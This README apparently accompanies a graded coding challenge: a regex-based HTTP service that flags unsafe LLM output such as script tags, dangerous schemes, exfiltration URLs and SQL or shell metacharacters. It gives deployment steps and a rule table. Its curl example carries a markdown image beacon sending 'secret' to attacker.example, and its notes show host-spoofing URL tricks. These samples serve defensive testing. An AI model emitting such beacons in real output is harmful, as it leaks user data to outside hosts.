# Problem-4 — LLM Output Handling Gate (OWASP LLM05)

`POST /sanitize-output` → `{"safe": true|false, "reason": "..."}`

Files: `gate.py` (rules), `server.py` (stdlib HTTP server), `test_gate.py` (44 probes).
No dependencies. **No AI calls** — the spec forbids an LLM and a phrase list; every
decision is a regex/URL-parse rule.

Allowlist (exact hostnames only): `cdn-20nrl5e.example`, `app-ym5llhd.example`.

## Run locally

```bash
cd Problem-4
python3 test_gate.py
python3 server.py            # http://localhost:8000
curl -s -X POST localhost:8000/sanitize-output -H 'content-type: application/json' \
  -d '{"channel":"markdown","output":"![x](https://attacker.example/log?d=secret)"}'
# {"safe": false, "reason": "EXTERNAL_EXFIL"}
```

## Deploy on render.com

1. Commit and push this folder to GitHub.
2. render.com → **New +** → **Web Service** → connect this repo.
3. Fill in exactly:
   - **Name:** `llm-output-gate` (anything)
   - **Language / Runtime:** `Python 3`
   - **Branch:** `main`
   - **Root Directory:** `Problem-4`
   - **Build Command:** `pip install --upgrade pip` (nothing to install)
   - **Start Command:** `python server.py`
   - **Instance Type:** Free
   - Environment variables: **none** (Render injects `PORT` itself)
4. Create Web Service, wait for "Live".
5. Test the public URL, then submit the **base URL only**:
   `https://llm-output-gate.onrender.com` — no trailing path, no query, no fragment.

Free instances sleep after inactivity; hit the base URL once right before
submitting so the first grader request isn't a cold start.

## How the rules are implemented

Order is fixed: schema → encoded → channel rules on the **original** string.

| Step | Implementation |
|---|---|
| `INVALID_SCHEMA` | body is a dict, `channel` ∈ 5 values, `output` is `str`, `len ≤ 20000` |
| `ENCODED_PAYLOAD` | `decode_once()` = `unquote` → `&#NN;`/`&#xNN;` → the 5 named entities → `\uXXXX`. If decoded ≠ original **and** the decoded string trips a channel rule |
| `SCRIPT_TAG` | `<\s*(script\|iframe\|object\|embed)\b` |
| `EVENT_HANDLER` | `(^\|[\s"'/])on[a-z0-9_-]+\s*=` (boundary stops `python=` false hits) |
| `DANGEROUS_SCHEME` | text matches `(javascript\|data\|vbscript)\s*:`, **or** an extracted absolute URL has a scheme ∉ {http, https} |
| `EXTERNAL_EXFIL` | any extracted absolute URL whose `urlsplit().hostname` is not exactly in the allowlist |
| `SQL_METACHAR` | `'` `"` `;` `--` `/*` `\bunion\b` `or\s+1\s*=\s*1` |
| `SHELL_METACHAR` | `; & \| \` < >` or `$(` or `${` |

URL extraction: `html` = quoted `src=`/`href=` values; `markdown` = target inside `](…)`;
`url` = the whole trimmed output.

Two details the hidden probes target:

- **Exact host, not substring.** `urlsplit().hostname` drops credentials, port and
  query, so `https://cdn-20nrl5e.example@attacker.example/` resolves to
  `attacker.example`, and `evil.cdn-20nrl5e.example` / `cdn-20nrl5e.example.attacker.test`
  both fail the set-membership test that a `in`-substring check would pass.
- **Protocol-relative is absolute.** `//host/path` is parsed as `https://host/path`;
  `/local/page` and bare `page.html` are relative and are ignored by both URL rules.
